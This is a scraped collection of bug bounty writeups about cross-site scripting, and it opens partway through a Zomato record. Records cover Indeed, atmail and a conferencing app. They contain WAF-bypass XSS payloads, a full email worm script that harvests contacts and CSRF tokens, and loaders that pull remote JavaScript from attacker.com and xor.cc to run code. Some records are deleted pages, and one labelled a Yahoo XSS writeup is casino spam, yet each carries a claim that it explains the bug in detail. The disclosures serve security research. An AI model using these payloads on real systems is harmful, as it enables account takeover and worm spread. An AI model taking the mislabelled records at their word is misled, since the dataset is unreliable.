it gave me some error. Press enter or click to view image in full size The parameter value was getting refleted in the source code, So i checked whether <,> are getting filtered or not.The result was, Naaah. Press enter or click to view image in full size I tried for xss but I couldn’t get it ,as there was waf.I spent some time on it but no progress, I started looking for XSS reports,waf bypass blogs then I tried with xss payload list. Boom yeah with the help of it I got the xss popup.The payload which worked for me was <marquee loop=1 width=0 onfinish=alert`1`>XSS</marquee> But I couldn’t access the DOM because alert(),confirm(),prompt() were getting blocked by the waf. Somehow I wanted to make it work, I tried url encoding the payload and other things but nothing worked.It was aound 3 : 40 am so I needed to go to bed coz don’t want to get late for school. After coming back I started looking for more articles,blogs.Then I got to remember about the xss cheatsheet which was by Somdev , here is the link https://github.com/s0md3v/AwesomeXSS co\\u006efirm() By encoding the character in unicode I was able to access the DOM. Press enter or click to view image in full size I submitted this report to Zomato,and the report was triaged and after that I went to sleep the next day when I woke up I checked the notification and I saw the mail “Zomato has rewarded you 250$”. In the report Prateek Tiwari mentioned that the problem was with Hydra which is an OAuth 2.0 and OpenID Connect Provider which Zomato are using for authentication on their services. For showing their gratitude,Hydra mentioned my name in their newsletter which was really great for me. Press enter or click to view image in full size Here is the report : https://hackerone.com/reports/456333 POC Video: A great thanks for reading the writeup. I hope you have enjoyed it. 📝 Read this story later in Journal . 🗞 Wake up every Sunday morning to the week’s most noteworthy Tech stories, opinions, and news waiting in your inbox: Get the noteworthy newsletter > Bugbounting -- -- 6 Written by Sudhanshu Rajbhar 1.3K followers · 190 following httpss://twitter.com/sudhanshur705 Responses ( 6 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@sampanna/self-xss-in-indeed-com-e0c99c104cba", "title": "My first bug bounty writeup. This is the writeup for my first bug… | by Sampanna Chimoriya | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@sampanna/self-xss-in-indeed-com-e0c99c104cba. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMy first bug bounty writeup. This is the writeup for my first bug… | by Sampanna Chimoriya | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in My first bug bounty writeup Sampanna Chimoriya 3 min read · Dec 10, 2018 -- Listen Share This is the writeup for my first bug bounty so I am really sorry if I have made some mistake. This blog will not very technical as it wasn’t very hard to discover and exploit. This post is just to prove to people who want to get in bugbounty that you can get into bugbounty and actually succeed. I visited Indeed.com bug bounty page and was happy to see that *.indeed.com was in scope. So I visited indeed.com and searched for manager in what field and google.com and searched. I tried various text and various characters to try and receive some error. After some minutes of typing various text, I saw an option to set an alert for a job.When I clicked the link I was redirected to Create job alerts! | Indeed.com Edit description subscriptions.indeed.com and immediately I tried <a href=https://www.google.com>Google</a> and input an email address and clicked Create job. I saw Click Here so I was really happy and when clicked redirected me to Google.com.Then I tried to inject <script>alert(1)</script> and it didn’t work. But when I tried <img src=x onerror=javascript:alert(document.domain);> I received alert and I was also able to steal cookies. I am writing this because it took me more than 2 months for me to properly explain and get it fixed because of the various mistakes I made along the way and want to help people not fall in the same trap. The first mistake I made was that reported it as self html injection because I didn’t try to test to receive an alert because I was just too happy that I actually found a bug. So my report was closed as N/A because it was just a simple html injection . So, I learned that even if you have found a bug try and stay calm and try to increase it’s threat. I made the report again but I was immediately denied as my first report was closed so it wasn’t even checked properly. So, understand that you have to properly explain with proper techniques and don’t expect that they will understand what you wanted. I respectfully wrote a detailed explanation that it wasn’t a simple html injection and javascript can be executed. They were happy that I decided to write the report again and asked to do so in the future if I think they didn’t understand it properly. If you think you report was not properly understood then respectfully explain it properly because they want to fix and work with you but you must be patient and clear. I had received a message that they acknowledged my report and submitted the report to developer team and I would be informed about the fix. But after 18 days I didn’t receive a message so I respectfully messaged them and I received a message that they are working on it and was fixed after some days of the message. So I just want to say that understand that it might take more than you think it might but don’t think they don’t want to fix it or get discouraged Before I found this vulnerability I had reported two vulnerability which had closed and I actually lost 2 points meaning I had -2 points. So when I submitted this report I got 5 points so my point became 3. I just wrote this because even though I had minus points and I worked hard and learned more and actually found a bug. If I can do it ofcourse anyone can do it. So never feel discouraged and always check robots.txt file. I also wanted to ask a question if anyone can help me how can I receive reward in Nepal since paypal is not allowed in Nepal so I haven’t been able to receive my reward. Any help is appreciated Security Bug Bounty Bugs Xss Attack Hacking -- -- Written by Sampanna Chimoriya 60 followers · 1 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@0ktavandi/xml-xss-in-yandex-ru-by-accident-7e63c692b4c0", "title": "410 account suspended — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@0ktavandi/xml-xss-in-yandex-ru-by-accident-7e63c692b4c0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 account suspended — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 This account is under investigation or was found in violation of the Medium Rules. There are thousands of stories to read on Medium. Visit our homepage to find one that’s right for you. Take me to Medium"}
{"source_url": "https://www.bishopfox.com/blog/2017/06/how-i-built-an-xss-worm-on-atmail/", "title": "How I Built An XSS Worm On Atmail | Bishop Fox", "friendly_explanation": "This is a bug bounty writeup from https://www.bishopfox.com/blog/2017/06/how-i-built-an-xss-worm-on-atmail/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I Built An XSS Worm On Atmail | Bishop Fox Executive brief on how PCI DSS 4.0 affects offensive security practices, penetration testing, and segmentation testing. Watch Now bishopfox-logo-grey Cosmos Services Resources Customers Partners About Us Get Started Introducing Cosmos Scoring high in the GigaOm Radar for the fourth year in a row! Get the Report Cosmos Overview Meet Cosmos: The continuous offensive security solution designed to provide proactive defense. Cosmos Attack Surface Management Get Cosmos Attack Surface Management (CASM) for unmatched visibility into your changing external attack surface with continuous discovery and mapping. Cosmos Application Penetration Testing Cosmos Application Penetration Testing (CAPT) strengthens the security of business-critical applications with in-depth assessments. Cosmos External Penetration Testing Cosmos External Penetration Testing (CEPT) builds on Cosmos Attack Surface Management to provide the highest level of attack surface protection with post-exploitation activities. The Best Defense is a Great Offense See Why We're the Leaders in Offensive Security Explore Services Application Security Application Pen Testing Hybrid App Assessment Mobile App Assessment View More Red Team & Readiness Social Engineering Incident Response Tabletop Exercise Ransomware Readiness IoT & Product Security Validate interconnected devices and products are secure against attackers. Cloud Security Assess cloud security posture with expert testing and analysis of your environment. Network Security External Pen Testing Internal Pen Testing AI/ML Security Assessment Fortify the security of rapidly evolving AI/ML applications, models, and supporting infrastructures. Compliance & Regulations Satisfy governance, risk, and compliance programs with our testing services. Assessments for Our Partners Cloud App Security Assessments (CASA) Unqork Security Assessments Amazon Alexa Assessments ioXt Alliance Testing & Certification View More A Ponemon Institute Report The State of Offensive Security Get the blueprint. Insights into how mature security organizations invest in offensive strategies. Get the Report Resource Center Virtual Sessions Events Guides & Reports Datasheets View All Advisories SonicWall Sonicos V7.1x and 8.0x Latest View All Blog Executive Posts Technology Posts Bishop Fox Labs Open-Source Tools Training Sessions & Workshops Cybersecurity Style Guide Why Partner with Us? The Best Defense is a Great Offense Join Forces with the Leaders in Offensive Security See Case Study Partner Program Overview See how we can work together to provide best-in-class security offerings. Find a Partner Check out our trusted partners to find the right solution for your needs. Become a Partner Apply to join forces with Bishop Fox. Assessments for Our Partners We're proud to work with Google, Meta, and Amazon to increase the security of their partner ecosystems. Cloud Application Security Assessments Mobile Application Security Assessment Nest Assessments Amazon Alexa Assessments We're Hiring! Want to Work with the Best Minds in Offensive Security? Be part of an elite team and work on projects that have a real impact. Explore Openings Company Overview Events Meet Bishop Fox at upcoming events. Newsroom Read the latest articles and press releases from Bishop Fox. Contact Us Want to get in touch? We're ready to connect. Career Opportunities Intern & Educational Programs Bishop Fox Mexico Search bishopfox-logo-grey bishopfox-logo-grey Cosmos Overview Cosmos Overview Cosmos Attack Surface Management Cosmos Application Penetration Testing Cosmos External Penetration Testing Services Overview Application Security Red Team & Readiness IoT & Product Security Cloud Security Network Security AI/ML Security Assessment Compliance & Regulations Assessments for Our Partners Resources Overview Resource Center Advisories Blog Bishop Fox Labs Customers Partners Overview Partner Program Overview Find a Partner Become a Partner Assessments for Our Partners About Us Overview Company Overview Events Newsroom Contact Us Career Opportunities Intern & Educational Programs Bishop Fox Mexico Get Started Search Blog // Technical // Jun 23, 2017 How I Built An XSS Worm On Atmail By: Zach Julian, Senior Security Consultant Share Atmail is a popular provider for cloud-based and on-premises email hosting. It is used by companies, hosting providers, and ISPs including DreamHost, LegalShield (US), m:tel (Bosnia), iiNet, and Optus (Australia). Being an atmail user on DreamHost, and having seen several impressive email-based cross-site scripting (XSS) attacks during my work with bug bounty programs, I attempted to find a vulnerability in their webmail front-end. I had a working payload a few hours later, but wanted to take it a step further by building an old-school XSS worm . The most well-known example of an XSS worm affected MySpace in 2005 , with a more recent variation targeting TweetDeck in 2014 . In this post, I’ll demonstrate building an XSS payload that propagates itself through a victim’s contacts. The Testing Environment Before starting, I prepared a simple testing environment. Emails were sent using a command like the following, piping the XSS test payloads within content into mail: cat content | mail -a \"Content-type: text/html\" -s \"test\" [email protected] I then used the Firefox Developer Tools to view how the XSS payload was rendered in the DOM of the webmail client. Building the XSS Payload The first step was to build an XSS payload that would survive atmail’s content filtering intact. I started by sending an email containing every valid HTML tag to see which ones would remain after it was delivered, although I eventually decided to use the <img> tag. While <img> lends itself well to building XSS payloads, its disadvantage is that the victim must decide to “Display Images” within atmail before the XSS will trigger. It is likely a better payload could be developed using a tag which renders without further user interaction. Next, I began taking notes on how atmail sanitized my payloads. I needed to observe how atmail manipulated the characters and HTML attributes in the <img> tag in order to evade the filter and render a syntactically-correct tag in the victim’s browser. By sending an <img> tag containing every valid attribute(1), I noticed that only the src, alt, longdesc, style, height, and width attributes were permitted. Additionally, I noticed several modifications to my payload, such as converting single quotes to double quotes, removing the onerror event, and removing any <img> tag without a src attribute. Although the onerror event was removed, I suspected the conversion of single to double quotes might help evade the whitelist if both were used in the <img> tag. In the end, this suspicion proved correct, although I had to use the set of double quotes across two <img> tags. The below is the working XSS payload: <img longdesc=\"src='x'onerror=alert(document.domain);//><img \" src='showme'> This was rendered as the following in the webmail client: <img longdesc=\"src=\" images=\"\" stop.png\"=\"\" onerror=\"alert(document.domain);//\"\" src=\"x\" alt=\"showme\"> Without viewing the application source code, it is impossible to know exactly what changes are being made to my payload before it is delivered. However, it appears that atmail interprets the single and double quotes in such a way that the two <img> tags are combined into one. Including the onerror event in the longdesc attribute has allowed it through the content filter and rendered the XSS correctly after processing. Building the Worm After finding a working XSS vector, the next step was to create a payload to spread my email worm. I wrote some JavaScript that executes in three steps: Extract a victim’s contacts list Grab a valid CSRF token from atmail Send an email to each of the victim’s contacts This code resembled the following, with the XSS payload included in the block of URL-encoded text: //HTTP request to grab victim's contacts xmlHttp=new XMLHttpRequest(); xmlHttp.open('GET','/index.php/mail/contacts/viewcontacts/GroupID/0',false); xmlHttp.send(null); response=xmlHttp.responseText; //Extract email addresses and filter duplicates var extractedemails = response.match(/[A-Z0-9._%+-]+@[A-Z0-9.-]+.[A-Z]{2,4}/igm); var uniqueemails = []; for(var i = 0; i < extractedemails.length; i++){if (uniqueemails.indexOf(extractedemails[i]) == -1) uniqueemails.push(extractedemails[i]);} //HTTP request to get CSRF token xmlHttp.open('GET','/index.php/mail/contacts',false); xmlHttp.send(null); response2=xmlHttp.responseText; var csrftoken = response2.match(/name=\\\"atmailCSRF\" value=\\\"(.+?)\\\"/im); //Loop through contacts and send email for (var i = 0; i < uniqueemails.length; i++) { xmlHttp.open('POST','/index.php/mail/composemessage/send',false); var params = 'atmailCSRF=' + csrftoken[1] + '&emailTo=' + unique[i] + '&emailSubject=open%20me&emailBodyHtml=%3c%68%33%3e%61%74%6d%61%69%6c%20%65%6d%61%69%6c%20%58%53%53%20%77%6f%72%6d%3c%2f%68%33%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0a%3c%69%6d%67%20%6c%6f%6e%67%64%65%73%63%3d%22%73%72%63%3d%27%78%27%6f%6e%65%72%72%6f%72%3d%65%76%61%6c%28%77%69%6e%64%6f%77%2e%61%74%6f%62%28%27%61%57%35%6a%62%48%56%6b%5a%54%31%6b%62%32%4e%31%62%57%56%75%64%43%35%6a%63%6d%56%68%64%47%56%46%62%47%56%74%5a%57%35%30%4b%43%64%7a%59%33%4a%70%63%48%51%6e%4b%54%74%70%62%6d%4e%73%64%57%52%6c%4c%6e%4e%79%59%7a%30%6e%61%48%52%30%63%48%4d%36%4c%79%39%68%64%48%52%68%59%32%74%6c%63%69%35%6a%62%32%30%76%59%58%52%74%59%57%6c%73%4c%6d%70%7a%4a%7a%74%6b%62%32%4e%31%62%57%56%75%64%43%35%6f%5a%57%46%6b%4c%6d%46%77%63%47%56%75%5a%45%4e%6f%61%57%78%6b%4b%47%6c%75%59%32%78%31%5a%47%55%70%4f%77%3d%3d%27%29%29%3b%2f%2f%3e%3c%69%6d%67%20%22%20%73%72%63%3d%27%73%68%6f%77%6d%65%27%3e'; xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xmlHttp.send(params); At first, I attempted to Base64-encode a minified version of this JavaScript and include it within the onerror event of the XSS payload. It would then be decoded and executed using eval(atob()), as shown below: <img longdesc=\" xss/ src='x'onerror=eval(window.atob('eGg9bmV3IFhNTEh0dHBS…omitted for brevity…'));//><img \" src='showme'> However, I noticed that atmail limited my Base64 string to 945 characters, which was too short. Instead of including the entire script in the onerror event, I hosted it at an external location, then rewrote my XSS payload like the following: onerror=\"include=document.createElement('script');include.src='https://attacker.com/atmail.js';document.head.appendChild(include);\" The payload shown above creates a new <script> tag in the <head> element of the page, including my malicious externally-hosted JavaScript. This was also Base64-encoded, making the final payload as follows: <img longdesc=\"src='x'onerror=eval(window.atob('aW5jbHVkZT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtpbmNsdWRlLnNyYz0naHR0cHM6Ly9hdHRhY2tlci5jb20vYXRtYWlsLmpzJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGluY2x1ZGUpOw=='));//><img \" src='showme'> With everything in place, the worm was now functional. This video demonstrates it in action: An XSS worm on atmail would benefit spammers and other malicious actors who would benefit from manipulating victims into sending arbitrary messages to their contacts list. Because of its viral nature and the additional trust associated with email received from a known contact, this attack would be well-suited for spam, malware delivery, or phishing attacks. Disclosure Timeline: After discovering this vulnerability, I began the responsible disclosure process with atmail. As of May 25, 2017, they have remediated the issue, which can be patched by upgrading to atmail version 7.8.0.2 . 2017-02-24 – Vulnerability reported 2017-02-27 – Report acknowledged 2017-05-25 – Patch released References (1) <img src=\"x\" align=\"left\" alt=\"test\" border=\"1px\" crossorigin=\"anonymous\" height=\"100px\" hspace=\"100px\" ismap longdesc=\"test\" sizes=\"(min-width: 600px) 200px, 50vw\" srcset=\"test.png 2x\" usemap=\"#test\" vspace=\"100px\" width=\"100px\"> Supercomputer image by Dennis van Zuijlekom Subscribe to our blog and advisories Be first to learn about latest tools, advisories, and findings. Thank You! You have been subscribed. About the author, Zach Julian Senior Security Consultant Zachary Julian is a Senior Security Consultant at Bishop Fox. In this role, he specializes in web application penetration testing, source code review, and hybrid application assessments. Zach discovered CVE-2017-11617 , a stored cross-site scripting vulnerability affecting a popular webmail product, and has presented at events such as (ISC)2 Phoenix, CactusCon, and Converge Detroit. He has also been quoted on topical security issues in Forbes, Vice Motherboard , The Intercept , and eSecurityPlanet . More by Zach Recommended Posts You might be interested in these related posts. Aug 06, 2025 Next-Level Fingerprinting: Tools, Logic, and Tactics Jul 09, 2025 You’re Pen Testing AI Wrong: Why Prompt Engineering Isn’t Enough Jun 26, 2025 Sitecore Experience Platform Vulnerabilities: Critical Update Needed for Versions 10.1 to 10.3 Jun 25, 2025 Sipping from the CVE Firehose: How We Prioritize Emerging Threats for Real-World Impact bishopfox-logo-grey Cosmos Platform Cosmos Attack Surface Management Cosmos Application Penetration Testing Cosmos External Penetration Testing Services Application Security Cloud Security IoT & Product Security Network Security Red Team & Readiness Compliance, Regulations, & Frameworks Google, Facebook, & Amazon Partner Assessments Resources Resource Center Blog Advisories Tools Our Customers Our Customer Stories Partners Partner Programs Partner Directory Become a Partner Company About Us Careers We're Hiring Events Newsroom Bishop Fox Mexico Bishop Fox Labs Contact Us Copyright © 2025 Bishop Fox Privacy Statement Responsible Disclosure Policy This site uses cookies to provide you with a great user experience. By continuing to use our website, you consent to the use of cookies. To find out more about the cookies we use, please see our Privacy Policy . Accept"}
{"source_url": "https://matatall.com/xss/rce/bugbounty/2015/09/08/xss-to-rce.html", "title": "XSS to RCE in ...", "friendly_explanation": "This is a bug bounty writeup from https://matatall.com/xss/rce/bugbounty/2015/09/08/xss-to-rce.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS to RCE in ... Blawg About Other posts 03 Mar 2022 » Job search is over, I'll be joining ActBlue 16 Feb 2022 » The perfect guest appearance (for me) 10 Feb 2022 » Bro do you even code 08 Feb 2022 » Boundaries 06 Feb 2022 » The perfect interview (for me) 26 Jan 2022 » Documenting my job search 08 Sep 2015 » XSS to RCE in ... 25 Jul 2014 » Twitter's CSP Report Collector 13 Dec 2013 » Automatic XSS Protection With CSP: No Changes Required 13 Jan 2013 » Removing Inline Javascript (for CSP) XSS to RCE in ... Sep 8, 2015 Note: this has been fixed . XSS to RCE “yeah right, RSnake” I accidentally triggered a cross-site scripting (XSS) vulnerability in <conf provider X> that worked when using the web application as well as the native OS X application (and possibly additional clients). Nowadays, XSS -> Remote Code Execution (RCE) is possible thanks to Node. For every person in any meeting that I join, I could execute code on their computer. Standup I entered a meeting with the classic first name of <img src=x onerror=alert()> (the bobby tables of XSS). A few minutes into the conversation, patrick noticed a broken image pop up. Uh oh. When I asked if he also saw an alert box, my colleague ben chimed in and said yes. So we have XSS. Sweet. In at least two clients. Hmmm, this could be bad. eval(prompt()) We noticed that there was some filtering going on (such as stripping quotes), so we’d have to use String.toCharCode to generate any string values. The web app enforced a value length but this is easily bypassed with a proxy and was not enforced in the desktop client. ben quickly came up with a good way to explore the impact of this xss with a simple debug console: <img src=x onerror=eval(prompt())> (35 chars) This lets us generate payloads without having to generate toCharCode code each time. Sure this isn’t difficult, but an executing prompt is so much easier to use. Exploring the native app greg took a look at the <conf provider X> native application and noticed it used Node. Perhaps process.open would work. It did. Putting it all together That’s when ben put everything together using a very short payload: <img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))> (80 chars) Now join any existing meeting and enter the above payload as your name. Everyone in the room see an alert box. Those using the native apps will also see their calculators open. How it works The use of String.fromCharCode is just a classic way to bypass filtering/escaping of quotes. String.fromCharCode(47,47,120,111,114,46,99,99) is //xor.cc . The payload can be simplified as: <img src=x onerror=$.getScript(\"//xor.cc\")> $.getScript tells jQuery to fetch and execute the javascript at xor.cc . The fetched javascript that opens the calculator is: process.open(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); (72 chars) Why it sort of matters XSS is XSS is XSS. But XSS in an app with an API to the filesystem is XSS is worse. <conf provider X> meetings typically are… unauthenticated. Everyone raise your hand. Now put down your hand if you have required password authentication for every meeting you have joined. Look to your left, look to your right, and notice everyone’s hand is still up. If you’ve used <conf provider X>, chance are you’ve used it in a manner that let’s this exploit work on any publicly known or guessable <conf provider X> meeting ID. I did not try to brute force the meeting space for open meetings. That would have been bad. Calculators You can’t have a good exploit unless calculators are involved. See PDF content-type sniffing for an even better use of calculators in an attack. Conclusion Big ups to the GitHub appsec team. Within one hour we went from XSS to RCE. And it played out like something in one of those movies or TV shows. “We popped a faux console using eval and prompt while ripping open the binary to leverage a libary with system access to perform remote code execution… to open a calculator.” Most of the credit has to go to ben and greg , I just found XSS and I wouldn’t have even known without patrick . Did I mention that we’re hiring an intern for the appsec team? Blawg Blawg neil.matatall@gmail.com oreoshake Just some ramblings. Probably about CSP."}
{"source_url": "https://medium.com/@sameerphad72/edmodo-xss-bug-9c0fc9bdd0bf", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@sameerphad72/edmodo-xss-bug-9c0fc9bdd0bf. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://www.mohamedharon.com/2019/02/still-work-redirect-yahoo-subdomain-xss.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2019/02/still-work-redirect-yahoo-subdomain-xss.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, 